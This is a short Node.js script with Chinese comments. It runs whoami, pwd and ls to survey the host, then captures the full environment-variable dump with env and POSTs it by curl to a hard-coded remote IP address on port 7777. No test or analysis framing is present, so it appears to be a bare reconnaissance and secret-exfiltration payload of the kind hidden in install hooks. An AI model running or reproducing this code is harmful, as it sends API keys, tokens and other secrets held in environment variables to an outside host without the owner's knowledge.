const { exec } = require('child_process');

// 执行 whoami 命令
exec('whoami', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 whoami 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`whoami 执行输出错误: ${stderr}`);
        return;
    }
    console.log(`whoami 命令结果:\n${stdout}`);
});

// 执行 pwd 命令
exec('pwd', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 pwd 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`pwd 执行输出错误: ${stderr}`);
        return;
    }
    console.log(`pwd 命令结果:\n${stdout}`);
});

// 执行 ls 命令
exec('ls', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 ls 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`ls 执行输出错误: ${stderr}`);
        return;
    }
    console.log(`ls 命令结果:\n${stdout}`);
});


// 执行 env 命令获取环境变量
exec('env', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行 env 时出错: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`env 执行输出错误: ${stderr}`);
        return;
    }

    // 将环境变量数据通过 curl 命令发送到远程服务器
    const data = stdout.trim();
    const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" https://139.180.193.16:7777`;

    exec(command, (curlError, curlStdout, curlStderr) => {
        if (curlError) {
            console.error(`执行 curl 时出错: ${curlError.message}`);
            return;
        }
        if (curlStderr) {
            console.error(`curl 执行输出错误: ${curlStderr}`);
            return;
        }
        console.log(`curl 命令结果:\n${curlStdout}`);
    });
});


